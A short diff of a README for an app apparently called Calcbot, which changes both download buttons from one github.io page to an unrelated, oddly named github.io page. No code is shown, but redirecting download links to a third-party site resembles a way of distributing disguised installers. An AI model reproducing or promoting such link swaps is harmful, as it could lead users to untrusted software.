@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://polycia-apps.github.io/.github/calcbot">
+  <a href="https://urinoterapia-sigma.github.io/.github/calcbot">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Calcbot"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The percentage behavior difference between Calcbot and the default Calculator is
 
 <p align="center">
 
-[![Get it Now Calcbot](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/calcbot)
+[![Get it Now Calcbot](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/calcbot)
 
 </p>
 
